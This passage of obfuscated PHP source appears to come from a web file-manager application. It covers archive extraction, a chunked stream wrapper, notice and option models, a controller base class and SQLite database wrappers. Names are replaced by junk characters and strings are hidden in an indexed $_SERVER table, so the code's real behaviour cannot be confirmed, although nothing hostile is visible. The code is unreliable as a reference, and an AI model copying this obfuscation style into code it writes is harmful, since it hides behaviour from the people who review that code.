$ù·©¨ú‹[8]) { break; } $¥÷å‹Ş— = in_array(get_path_ext($‘ÆæÛ£õ[$ù·©¨ú‹[1270]]), array($ù·©¨ú‹[389], $ù·©¨ú‹[1260], $ù·©¨ú‹[1261], $ù·©¨ú‹[1262], $ù·©¨ú‹[1263], $ù·©¨ú‹[1264])); $ôìë¡ = $ß³óø¶ == count($¥•áñı¬) - 1 && $¥÷å‹Ş—; $ª­Ø²ı´ = $ûö°‘Š£ . $‘ÆæÛ£õ[$ù·©¨ú‹[1270]]; $È‚Ù»— = $ûö°‘Š£ . get_path_this($‘ÆæÛ£õ[$ù·©¨ú‹[32]]); if (IO::exist($ª­Ø²ı´)) { $øçÛ ¿Ò = $ª­Ø²ı´; continue; } $¯¹âè©» = $ß³óø¶ == 0 ? get_path_ext($¢ş–µõë) : get_path_ext($øçÛ ¿Ò); $‰ı¤Ååì = KodArchive::extract(self::iconvSystem($øçÛ ¿Ò), $ûö°‘Š£, $‘ÆæÛ£õ[$ù·©¨ú‹[1255]], $ÓèçÛœô, $¯¹âè©»); self::unzipErrorCheck($‰ı¤Ååì, array($ù·©¨ú‹[1276], $¢ªÜãÌŸ, $¥•áñı¬, $‘ÆæÛ£õ, $ª­Ø²ı´)); if (IO::exist($È‚Ù»—)) { IO::rename($È‚Ù»—, get_path_this($ª­Ø²ı´)); } $øçÛ ¿Ò = $ª­Ø²ı´; } $Íøœ°‹ = $øçÛ ¿Ò; return array($ù·©¨ú‹[230] => $øçÛ ¿Ò, $ù·©¨ú‹[1254] => $¥•áñı¬, $ù·©¨ú‹[1256] => $ûö°‘Š£); } private static function unzipErrorCheck($’Şü˜º, $À«¯Ç = false) { $Èà‹Ò¥» =& $_SERVER[‹è™Ü¸Ñ]; if ($’Şü˜º[$Èà‹Ò¥»[1277]]) { return !0; } write_log(array($Èà‹Ò¥»[1278], $’Şü˜º, $À«¯Ç), $Èà‹Ò¥»[1279]); show_json($Èà‹Ò¥»[1280] . json_encode($’Şü˜º[$Èà‹Ò¥»[1267]]), !1); die; } } goto A ë»„ñÎŞ; aŒ¿¯ª…÷: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($£å’˜ê«, $‘¾Ä‹‚ = '') { $this->info = $this->info($£å’˜ê«); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[‹è™Ü¸Ñ][87]]; $this->pathOpen = $£å’˜ê«; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$£å’˜ê«])) { self::$_chunkBuffer[$£å’˜ê«] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¬¼ìğƒ”) { $««³°â = $this->fileSubstr($this->pose, $¬¼ìğƒ”); $this->pose += strlen($««³°â); return $««³°â; } public function stream_tell() { return $this->pose; } public function stream_seek($ûÀù¯°, $ıÃ£öœ) { $–üŸæŸõ =& $_SERVER[‹è™Ü¸Ñ]; if ($ıÃ£öœ == SEEK_SET) { $this->pose = $ûÀù¯°; } else { if ($ıÃ£öœ == SEEK_CUR) { $this->pose += $ûÀù¯°; } else { if ($ıÃ£öœ == SEEK_END) { $this->pose = $this->info[$–üŸæŸõ[79]] + intval($ûÀù¯°); } } } if ($ûÀù¯° < 0) { $this->pose = $this->info[$–üŸæŸõ[79]] + $ûÀù¯°; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[‹è™Ü¸Ñ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¢œ¤¼¯Ó, $ï…õñª‘) { $ö×ÒÃèû =& $_SERVER[‹è™Ü¸Ñ]; $àŠÉÏúÍ = $this->info($¢œ¤¼¯Ó); return array($ö×ÒÃèû[1586] => 0, $ö×ÒÃèû[1587] => 0, $ö×ÒÃèû[16] => 32768 + 511, $ö×ÒÃèû[1588] => 0, $ö×ÒÃèû[1589] => 0, $ö×ÒÃèû[1590] => 0, $ö×ÒÃèû[1591] => 0, $ö×ÒÃèû[79] => $àŠÉÏúÍ[$ö×ÒÃèû[79]], $ö×ÒÃèû[1592] => $àŠÉÏúÍ[$ö×ÒÃèû[1432]], $ö×ÒÃèû[1548] => $àŠÉÏúÍ[$ö×ÒÃèû[88]], $ö×ÒÃèû[1547] => $àŠÉÏúÍ[$ö×ÒÃèû[231]], $ö×ÒÃèû[1593] => 0, $ö×ÒÃèû[1594] => 0); } static $fileInfo = array(); public function info($íùÇÒİÁ) { $Ñ¥¬ÌáÛ = $_SERVER[‹è™Ü¸Ñ][1595]; if (isset(self::$fileInfo[$íùÇÒİÁ])) { return self::$fileInfo[$íùÇÒİÁ]; } if (substr($íùÇÒİÁ, 0, strlen($Ñ¥¬ÌáÛ)) != $Ñ¥¬ÌáÛ) { return !1; } self::$fileInfo[$íùÇÒİÁ] = IO::info(substr($íùÇÒİÁ, strlen($Ñ¥¬ÌáÛ))); return self::$fileInfo[$íùÇÒİÁ]; } public static function read($Şƒìè‘Ğ, $¸èŞÀÓ, $‰‰äÀü‰) { if (!isset(self::$_fopenCache[$Şƒìè‘Ğ])) { $§¹òÇÉ = new StreamWrapperIO(); $§¹òÇÉ->stream_open($Şƒìè‘Ğ); self::$_fopenCache[$Şƒìè‘Ğ] = $§¹òÇÉ; } $§¹òÇÉ = self::$_fopenCache[$Şƒìè‘Ğ]; return $§¹òÇÉ->fileSubstr($¸èŞÀÓ, $‰‰äÀü‰); } public static function _read($¹¢†æ­, $Ô¡ˆµÅë, $°Á°é¶ô) { $ôåÓ§¨º =& $_SERVER[‹è™Ü¸Ñ]; $ÛÒé¥Õè = fopen($¹¢†æ­, $ôåÓ§¨º[1436]); if (!$ÛÒé¥Õè) { return $ôåÓ§¨º[12]; } $·†ìİï = 8192; fseek($ÛÒé¥Õè, $Ô¡ˆµÅë, SEEK_SET); $ŞßĞ´Ğ… = $ôåÓ§¨º[12]; $ááãŞÂğ = 0; while ($ááãŞÂğ < $°Á°é¶ô) { $ïš†ø©† = min($·†ìİï, $°Á°é¶ô - $ááãŞÂğ); $ŞßĞ´Ğ… .= fread($ÛÒé¥Õè, $ïš†ø©†); $ááãŞÂğ += $ïš†ø©†; } fclose($ÛÒé¥Õè); return $ŞßĞ´Ğ…; } public function fileSubstr($âáêÌ¿, $±ŠÍÈ¿…) { $Ç®¤ìĞí =& $_SERVER[‹è™Ü¸Ñ]; $ÈÕáƒù¤ = $this->info[$Ç®¤ìĞí[79]]; $±ªÒšªá = $âáêÌ¿; $†ÛÛÏÀŞ = $±ŠÍÈ¿…; if ($âáêÌ¿ < 0) { $âáêÌ¿ = $ÈÕáƒù¤ + $âáêÌ¿; } if ($±ŠÍÈ¿… === !1) { $±ŠÍÈ¿… = $ÈÕáƒù¤ - $âáêÌ¿; } if ($âáêÌ¿ + $±ŠÍÈ¿… > $ÈÕáƒù¤) { $±ŠÍÈ¿… = $ÈÕáƒù¤ - $âáêÌ¿; } if ($±ŠÍÈ¿… <= 0) { return $Ç®¤ìĞí[12]; } if ($âáêÌ¿ < 0 || $âáêÌ¿ >= $ÈÕáƒù¤ || $±ŠÍÈ¿… <= 0 || $±ŠÍÈ¿… > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\x69\x6c\x65\x52\145\x61\x64\x20\145\x72\x72\157\x72\41\40\x73\x74\141\162\x74\x3d{$âáêÌ¿}\73\154\145\156\x67\164\150\75{$±ŠÍÈ¿…}\73\x20\x73\x69\x7a\x65\75{$ÈÕáƒù¤}\x3b"); } $­»¡°æø = 64 * 1024; $¶÷Ø˜¯… =& self::$_chunkBuffer[$this->path]; if (!$¶÷Ø˜¯…) { $¶÷Ø˜¯… = array(); } $Ö©¾Óú = 0; $úá‚ò–‰ = 0; $¥Ú´¢Áì = $Ç®¤ìĞí[12]; foreach ($¶÷Ø˜¯… as $Ö©¾Óú => $¥Ú´¢Áì) { $Ö©¾Óú = intval($Ö©¾Óú); $úá‚ò–‰ = $Ö©¾Óú + strlen($¥Ú´¢Áì); if ($âáêÌ¿ >= $úá‚ò–‰) { continue; } if ($âáêÌ¿ >= $Ö©¾Óú && $âáêÌ¿ + $±ŠÍÈ¿… <= $úá‚ò–‰) { return substr($¥Ú´¢Áì, $âáêÌ¿ - $Ö©¾Óú, $±ŠÍÈ¿…); } break; } if (count($¶÷Ø˜¯…) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ç®¤ìĞí[1596], $Ç®¤ìĞí[1597] . count($¶÷Ø˜¯…) . "\73\x73\x74\141\x72\164\x3d{$âáêÌ¿}\54\154\x65\156\x67\164\x68\75{$±ŠÍÈ¿…}\x3b\160\x6f\x73\145\x3a{$Ö©¾Óú}\x7e{$úá‚ò–‰}"); throw new Exception($Ç®¤ìĞí[1598]); } $˜÷ƒÎìö = intval($âáêÌ¿ / $­»¡°æø) * $­»¡°æø; $Ó ·®½ = ceil(($âáêÌ¿ + $±ŠÍÈ¿…) / $­»¡°æø) * $­»¡°æø - $˜÷ƒÎìö; $ü­‘ø˜¢ = IO::fileSubstr($this->path, $˜÷ƒÎìö, $Ó ·®½); $¶÷Ø˜¯…[$˜÷ƒÎìö . $Ç®¤ìĞí[12]] = $ü­‘ø˜¢; ksort($¶÷Ø˜¯…); $‹¬¬òô¿ = substr($ü­‘ø˜¢, $âáêÌ¿ - $˜÷ƒÎìö, $±ŠÍÈ¿…); return $‹¬¬òô¿; } private function log($ˆ¦üºÙâ, $Èßä¨») { $Ä‚´Ÿñ¯ =& $_SERVER[‹è™Ü¸Ñ]; $€øÂâ¢Ò = timeFloat() - $this->timeStart; write_log(sprintf($Ä‚´Ÿñ¯[1599], $ˆ¦üºÙâ, $this->info[$Ä‚´Ÿñ¯[32]], $€øÂâ¢Ò, $Èßä¨»), $Ä‚´Ÿñ¯[1244]); } } class Message { function __construct() { } public function send($æ©³ˆË¯ = '', $Õ‰»‚ÂÔ = array(), $ñ˜×è®Ç = "\x74\x65\170\164") { $ÙºÚ­º‹ =& $_SERVER[‹è™Ü¸Ñ]; $ç³‘Ÿ· = array($ÙºÚ­º‹[33] => $ÙºÚ­º‹[1600], $ÙºÚ­º‹[171] => $æ©³ˆË¯); if (in_array($ñ˜×è®Ç, array($ÙºÚ­º‹[1600], $ÙºÚ­º‹[1601]))) { $ç³‘Ÿ·[$ÙºÚ­º‹[33]] = $ñ˜×è®Ç; } $Õ‰»‚ÂÔ = array($ÙºÚ­º‹[578] => isset($Õ‰»‚ÂÔ[$ÙºÚ­º‹[578]]) ? $Õ‰»‚ÂÔ[$ÙºÚ­º‹[578]] : $ÙºÚ­º‹[12], $ÙºÚ­º‹[662] => isset($Õ‰»‚ÂÔ[$ÙºÚ­º‹[662]]) ? $Õ‰»‚ÂÔ[$ÙºÚ­º‹[662]] : $ÙºÚ­º‹[12]); if (empty($æ©³ˆË¯) || empty($Õ‰»‚ÂÔ[$ÙºÚ­º‹[578]]) && empty($Õ‰»‚ÂÔ[$ÙºÚ­º‹[662]])) { return !1; } $×Ÿ—› = array($ÙºÚ­º‹[1528] => $ç³‘Ÿ·, $ÙºÚ­º‹[1602] => $Õ‰»‚ÂÔ); Hook::trigger($ÙºÚ­º‹[1603], $×Ÿ—›); } } $_file = $_SERVER[$_SERVER[‹è™Ü¸Ñ][932]]; goto fõÚ‹¾‚Õ™; FÜ´¯¥åé: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\156\157\164\151\143\x65\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x63\x6f\x6e\x74\x65\x6e\164", "\x61\165\x74\150", "\x6d\x6f\144\145", "\164\151\x6d\x65", "\x74\171\x70\145", "\x6c\145\166\145\x6c", "\145\156\141\x62\154\x65", "\x73\x6f\x72\164"); public function listData($´û­˜«Í = false, $ ÄïÍ×³ = "\x73\x6f\162\164", $ œüêÂß = false) { return parent::listData($´û­˜«Í, $ ÄïÍ×³, $ œüêÂß); } public function add($¢–”Õ) { $şä¹Õ×æ =& $_SERVER[‹è™Ü¸Ñ]; $ÄúÙë«ı = time(); if ($¢–”Õ[$şä¹Õ×æ[16]] == $şä¹Õ×æ[2415]) { $ÄúÙë«ı = strtotime($¢–”Õ[$şä¹Õ×æ[206]]); } $¢–”Õ[$şä¹Õ×æ[206]] = $ÄúÙë«ı; return parent::insert($¢–”Õ); } public function update($³Üëßã, $ÒúÖ‰¡Ş) { $·Îæì„· =& $_SERVER[‹è™Ü¸Ñ]; $ÙëèĞ° = $this->listData($³Üëßã); if (!$ÙëèĞ°) { return !1; } $¬¿¶Ğ = time(); if ($ÒúÖ‰¡Ş[$·Îæì„·[16]] == $·Îæì„·[2415]) { $¬¿¶Ğ = strtotime($ÒúÖ‰¡Ş[$·Îæì„·[206]]); } $ÒúÖ‰¡Ş[$·Îæì„·[206]] = $¬¿¶Ğ; return parent::update($³Üëßã, $ÒúÖ‰¡Ş); } public function remove($±òÖÆ) { $õÌ³¬°š = $this->listData($±òÖÆ); if (!$õÌ³¬°š || $õÌ³¬°š[$_SERVER[‹è™Ü¸Ñ][191]]) { return !1; } return parent::remove($±òÖÆ); } public function sort($¹Û¬²üò, $Æ ™Öğ‘) { return parent::update($¹Û¬²üò, $Æ ™Öğ‘); } public function enable($¨ûÖ£«, $Â¸˜ÆØş) { return parent::update($¨ûÖ£«, array($_SERVER[‹è™Ü¸Ñ][2416] => $Â¸˜ÆØş)); } private function initUserOption() { $ÃŒ°æ¾ =& $_SERVER[‹è™Ü¸Ñ]; $this->optionType = $ÃŒ°æ¾[2417]; $this->modelType = $ÃŒ°æ¾[2418]; $this->field = array($ÃŒ°æ¾[2419], $ÃŒ°æ¾[32], $ÃŒ°æ¾[206], $ÃŒ°æ¾[33], $ÃŒ°æ¾[2420], $ÃŒ°æ¾[805], $ÃŒ°æ¾[226]); } public function userNoticeGet($Ö—‡«¦â = false) { $this->initUserOption(); return parent::listData($Ö—‡«¦â, $_SERVER[‹è™Ü¸Ñ][475], !0); } public function userNoticeAdd($õš›«¸ƒ) { $¦Ü”¼ßù =& $_SERVER[‹è™Ü¸Ñ]; $this->initUserOption(); $ìú¶†÷¡ = $this->findByKey($¦Ü”¼ßù[2419], $õš›«¸ƒ[$¦Ü”¼ßù[475]]); if ($ìú¶†÷¡) { return !0; } $·Ê¿çâœ = array($¦Ü”¼ßù[2419] => $õš›«¸ƒ[$¦Ü”¼ßù[475]], $¦Ü”¼ßù[32] => $õš›«¸ƒ[$¦Ü”¼ßù[32]], $¦Ü”¼ßù[206] => $õš›«¸ƒ[$¦Ü”¼ßù[206]], $¦Ü”¼ßù[33] => isset($õš›«¸ƒ[$¦Ü”¼ßù[33]]) ? $õš›«¸ƒ[$¦Ü”¼ßù[33]] : 1, $¦Ü”¼ßù[2420] => isset($õš›«¸ƒ[$¦Ü”¼ßù[2420]]) ? $õš›«¸ƒ[$¦Ü”¼ßù[2420]] : 0, $¦Ü”¼ßù[805] => 0, $¦Ü”¼ßù[226] => 0); return parent::insert($·Ê¿çâœ); } public function userNoticeEdit($’šª‚µŞ, $÷‰¯ûªó) { $this->initUserOption(); return parent::update($’šª‚µŞ, $÷‰¯ûªó); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\155\137\x6f\x70\x74\x69\157\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\x6c\x65", "\162\157\x6c\145\107\x72\157\165\160", "\x72\x65\147\x69\x73\x74", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($ãöÊ™Œµ) { return "\x53\171\163\164\145\155\x4f\160\164\151\x6f\156\x5f{$ãöÊ™Œµ}"; } protected function optionDefault($¸¸×ÃøÀ = '') { $ç±äÍ¹ =& $_SERVER[‹è™Ü¸Ñ]; if ($¸¸×ÃøÀ == $ç±äÍ¹[12]) { return $GLOBALS[$ç±äÍ¹[6]][$ç±äÍ¹[457]]; } } } class SystemRecordModel extends ModelBaseLight { } goto AˆÑ°Ï¿‚; bºŠ¸×œê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $´¾˜šû¦ =& $_SERVER[‹è™Ü¸Ñ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$´¾˜šû¦[6]] =& $config; $this->values[$´¾˜šû¦[7]] =& $in; $this->tpl = TEMPLATE . MOD . $´¾˜šû¦[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($§ã¯±Û¹) { if (1 === func_num_args()) { $this->{$§ã¯±Û¹} = new $§ã¯±Û¹(); } else { $ªóÒ‘‹Ç = new ReflectionClass($§ã¯±Û¹); $–É˜¤¡ì = func_get_args(); array_shift($–É˜¤¡ì); $this->{$§ã¯±Û¹} = $ªóÒ‘‹Ç->newInstanceArgs($–É˜¤¡ì); } return $this->{$§ã¯±Û¹}; } public function routeBind($åá€èåÔ, $«€²Ì³ş, $ÎÃÏ¡¶ = 3) { $¢ÎêıÕî =& $_SERVER[‹è™Ü¸Ñ]; $Ú—ÏÙ = $this->in[$¢ÎêıÕî[9]]; $åá€èåÔ = str_replace($¢ÎêıÕî[10], $¢ÎêıÕî[11], trim(trim($åá€èåÔ, $¢ÎêıÕî[8]), $¢ÎêıÕî[12])); if (!$åá€èåÔ || count($Ú—ÏÙ) <= $ÎÃÏ¡¶) { return !1; } $¶¨ƒˆĞÀ = !0; $Ó‰ºÈ·Ó = explode($¢ÎêıÕî[8], $åá€èåÔ); for ($şµ¤Äóê = 0; $şµ¤Äóê < count($Ó‰ºÈ·Ó); $şµ¤Äóê++) { if ($Ó‰ºÈ·Ó[$şµ¤Äóê] != $Ú—ÏÙ[$ÎÃÏ¡¶ + $şµ¤Äóê]) { $¶¨ƒˆĞÀ = !1; break; } } if (!$¶¨ƒˆĞÀ) { return; } call_user_func_array(array($this, $«€²Ì³ş), array()); } public function routeArgs($¶É•™› = 3) { $ÒÚÜĞÖÅ = $this->in[$_SERVER[‹è™Ü¸Ñ][9]]; if (count($ÒÚÜĞÖÅ) <= $¶É•™›) { return array(); } $¼ÊÏû± = array(); for ($†·°Ç® = $¶É•™›; $†·°Ç® < count($ÒÚÜĞÖÅ); $†·°Ç® += 2) { $¼ÊÏû±[$ÒÚÜĞÖÅ[$†·°Ç®]] = $ÒÚÜĞÖÅ[$†·°Ç® + 1]; $this->in[$ÒÚÜĞÖÅ[$†·°Ç®]] = $ÒÚÜĞÖÅ[$†·°Ç® + 1]; } return $¼ÊÏû±; } protected function assign($»¼Úğ–, $Á£Ä³Ëè) { $this->values[$»¼Úğ–] = $Á£Ä³Ëè; } protected function display($¦Ôí±íŸ) { ob_end_clean(); extract($this->values); require $this->tpl . $¦Ôí±íŸ; } } class DbSqliteBase extends Db { public function __construct($º³°‰û¯ = '') { $šàé€¹é =& $_SERVER[‹è™Ü¸Ñ]; if (!extension_loaded($šàé€¹é[13])) { think_exception(think_lang($šàé€¹é[14]) . $šàé€¹é[15]); } if (!empty($º³°‰û¯)) { if (!isset($º³°‰û¯[$šàé€¹é[16]])) { $º³°‰û¯[$šàé€¹é[16]] = 438; } $this->config = $º³°‰û¯; if (empty($this->config[$šàé€¹é[17]])) { $this->config[$šàé€¹é[17]] = array(); } } } public function connect($‘æœ‘¨Å = '', $¾¯±„÷İ = 0) { $íİô±Ö¹ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->linkID[$¾¯±„÷İ])) { if (empty($‘æœ‘¨Å)) { $‘æœ‘¨Å = $this->config; } $¡Â‡ñÏ¶ = !empty($‘æœ‘¨Å[$íİô±Ö¹[17]][$íİô±Ö¹[18]]) ? $‘æœ‘¨Å[$íİô±Ö¹[17]][$íİô±Ö¹[18]] : $this->pconnect; $åÜ²º‰ = $¡Â‡ñÏ¶ ? $íİô±Ö¹[19] : $íİô±Ö¹[20]; $this->linkID[$¾¯±„÷İ] = $åÜ²º‰($‘æœ‘¨Å[$íİô±Ö¹[21]], $‘æœ‘¨Å[$íİô±Ö¹[16]]); if (!$this->linkID[$¾¯±„÷İ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¾¯±„÷İ], 30000); if (1 != think_config($íİô±Ö¹[22])) { unset($this->config); } } return $this->linkID[$¾¯±„÷İ]; } public function free() { $this->queryID = null; } public function query($Í÷òÀ) { $ÌŒşÓšÍ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Í÷òÀ; if ($this->queryID) { $this->free(); } think_action_status($ÌŒşÓšÍ[23], 1); think_status($ÌŒşÓšÍ[24]); $this->queryID = sqlite_query($this->_linkID, $Í÷òÀ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $™÷Â˜ƒÆ = $this->getAll(); return $™÷Â˜ƒÆ; } } public function execute($§‡Üü›¶) { $ğÖŸê… =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $§‡Üü›¶; if ($this->queryID) { $this->free(); } think_action_status($ğÖŸê…[25], 1); think_status($ğÖŸê…[24]); $Éœ¼ºç = sqlite_exec($this->_linkID, $§‡Üü›¶); $this->debug(); if (!1 === $Éœ¼ºç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[‹è™Ü¸Ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $„Íø”’Ç = sqlite_query($this->_linkID, $_SERVER[‹è™Ü¸Ñ][27]); if (!$„Íø”’Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŠÈñÒ¡é = sqlite_query($this->_linkID, $_SERVER[‹è™Ü¸Ñ][28]); if (!$ŠÈñÒ¡é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ˆ¦ÖõÁÖ = array(); if ($this->numRows > 0) { for ($€¹Ò˜Õ• = 0; $€¹Ò˜Õ• < $this->numRows; $€¹Ò˜Õ•++) { $ˆ¦ÖõÁÖ[$€¹Ò˜Õ•] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ˆ¦ÖõÁÖ; } public function getFields($’•ĞÖà¶) { $Š²…Æ‹è =& $_SERVER[‹è™Ü¸Ñ]; $ÕüÌÑÛ¸ = $this->query($Š²…Æ‹è[29] . $’•ĞÖà¶ . $Š²…Æ‹è[30]); $¦û×·ã‰ = array(); if ($ÕüÌÑÛ¸) { foreach ($ÕüÌÑÛ¸ as $Î„¾¼Ÿ„ => $ä§»ëİ) { $¦û×·ã‰[$ä§»ëİ[$Š²…Æ‹è[31]]] = array($Š²…Æ‹è[32] => $ä§»ëİ[$Š²…Æ‹è[31]], $Š²…Æ‹è[33] => $ä§»ëİ[$Š²…Æ‹è[34]], $Š²…Æ‹è[35] => (bool) ($ä§»ëİ[$Š²…Æ‹è[36]] === $Š²…Æ‹è[12]), $Š²…Æ‹è[37] => $ä§»ëİ[$Š²…Æ‹è[38]], $Š²…Æ‹è[39] => strtolower($ä§»ëİ[$Š²…Æ‹è[40]]) == $Š²…Æ‹è[41], $Š²…Æ‹è[42] => strtolower($ä§»ëİ[$Š²…Æ‹è[43]]) == $Š²…Æ‹è[44]); } } return $¦û×·ã‰; } public function getTables($ìÎš¯êÖ = '') { $‰ä¸òÚú =& $_SERVER[‹è™Ü¸Ñ]; $ßº¯É´¡ = $this->query($‰ä¸òÚú[45] . $‰ä¸òÚú[46] . $‰ä¸òÚú[47]); $ÓÉ §¸¯ = array(); foreach ($ßº¯É´¡ as $¥™ŒÅÌì => $è¢‡¸´ê) { $ÓÉ §¸¯[$¥™ŒÅÌì] = current($è¢‡¸´ê); } return $ÓÉ §¸¯; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $†ï²åìâ =& $_SERVER[‹è™Ü¸Ñ]; $ĞõÇ«¤ = sqlite_last_error($this->_linkID); $this->error = $ĞõÇ«¤ . $†ï²åìâ[4] . sqlite_error_string($ĞõÇ«¤); if ($†ï²åìâ[12] != $this->queryStr) { $this->error .= LNG($†ï²åìâ[48]) . $this->queryStr; } think_trace($this->error, $†ï²åìâ[12], $†ï²åìâ[49]); return $this->error; } public function escapeString($œ—‚¢³³) { return sqlite_escape_string($œ—‚¢³³); } public function parseLimit($ÓÄ÷èìÓ) { $Î®¨Ó÷ü =& $_SERVER[‹è™Ü¸Ñ]; $¡ÀµÜÜ = $Î®¨Ó÷ü[12]; if (!empty($ÓÄ÷èìÓ)) { $ÓÄ÷èìÓ = explode($Î®¨Ó÷ü[50], $ÓÄ÷èìÓ); if (count($ÓÄ÷èìÓ) > 1) { $¡ÀµÜÜ .= $Î®¨Ó÷ü[51] . $ÓÄ÷èìÓ[1] . $Î®¨Ó÷ü[52] . $ÓÄ÷èìÓ[0] . $Î®¨Ó÷ü[53]; } else { $¡ÀµÜÜ .= $Î®¨Ó÷ü[51] . $ÓÄ÷èìÓ[0] . $Î®¨Ó÷ü[53]; } } return $¡ÀµÜÜ; } } class DbSqlite3Base extends Db { public function __construct($èİòäÃ« = '') { $¹Õ¬ø½ =& $_SERVER[‹è™Ü¸Ñ]; if (!class_exists($¹Õ¬ø½[54])) { think_exception(think_lang($¹Õ¬ø½[14]) . $¹Õ¬ø½[55]); } if (!empty($èİòäÃ«)) { if (!isset($èİòäÃ«[$¹Õ¬ø½[16]])) { $èİòäÃ«[$¹Õ¬ø½[16]] = 438; } $this->config = $èİòäÃ«; if (empty($this->config[$¹Õ¬ø½[17]])) { $this->config[$¹Õ¬ø½[17]] = array(); } } } public function connect($¹ÊŞ„Ë = '', $ìÍğ”ÜÀ = 0) { $©¬¦Ñˆü =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($this->linkID[$ìÍğ”ÜÀ])) { if (empty($¹ÊŞ„Ë)) { $¹ÊŞ„Ë = $this->config; } $this->linkID[$ìÍğ”ÜÀ] = new SQLite3($¹ÊŞ„Ë[$©¬¦Ñˆü[21]]); if (!$this->linkID[$ìÍğ”ÜÀ]) { think_exception($this->linkID[$ìÍğ”ÜÀ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ìÍğ”ÜÀ]->busyTimeout(30000); if (1 != think_config($©¬¦Ñˆü[22])) { unset($this->config); } } return $this->linkID[$ìÍğ”ÜÀ]; } public function free() { $this->queryID = null; } public function query($¡úßë¿Ï) { $À°ˆ‡´Ï =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¡úßë¿Ï; if ($this->queryID) { $this->free(); } think_action_status($À°ˆ‡´Ï[23], 1); think_status($À°ˆ‡´Ï[24]); $this->queryID = $this->_linkID->query($¡úßë¿Ï); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ĞÌòøğÛ = $this->getAll(); $this->numRows = count($ĞÌòøğÛ); return $ĞÌòøğÛ; } } public function execute($ø§åˆĞ) { $š¦ìÛÃÇ =& $_SERVER[‹è™Ü¸Ñ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ø§åˆĞ; if ($this->queryID) { $this->free(); } think_action_status($š¦ìÛÃÇ[25], 1); think_status($š¦ìÛÃÇ[24]); $åµİ = $this->_linkID->exec($ø§åˆĞ); $this->debug(); if (!1 === $åµİ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[‹è™Ü¸Ñ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Æşª™å¯ = $this->_linkID->query($_SERVER[‹è™Ü¸Ñ][27]); if (!$Æşª™å¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸˜¡…Ê = $this->_linkID->query($_SERVER[‹è™Ü¸Ñ][28]); if (!$¸˜¡…Ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ºØÅœ˜Ì = array(); while ($Ë±¨¸¸¨ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ºØÅœ˜Ì[] = $Ë±¨¸¸¨; } $this->queryID->reset(); return $ºØÅœ˜Ì; } public function getFields($ÂåØà­ø) { $Ö£¾ûı =& $_SERVER[‹è™Ü¸Ñ]; $¸•ü‚ÆÅ = $this->query($Ö£¾ûı[29] . $ÂåØà­ø . $Ö£¾ûı[30]); $©­»ÖªÅ = array(); if ($¸•ü‚ÆÅ) { foreach ($¸•ü‚ÆÅ as $åÕ¨äÁ => $éˆáğÇé) { $©­»ÖªÅ[$éˆáğÇé[$Ö£¾ûı[32]]] = array($Ö£¾ûı[32] => $éˆáğÇé[$Ö£¾ûı[32]], $Ö£¾ûı[33] => $éˆáğÇé[$Ö£¾ûı[33]], $Ö£¾ûı[35] => (bool) ($éˆáğÇé[$Ö£¾ûı[35]] === $Ö£¾ûı[12]), $Ö£¾ûı[37] => $éˆáğÇé[$Ö£¾ûı[56]], $Ö£¾ûı[39] => (bool) $éˆáğÇé[$Ö£¾ûı[57]], $Ö£¾ûı[42] => (bool) $éˆáğÇé[$Ö£¾ûı[57]]); } } return 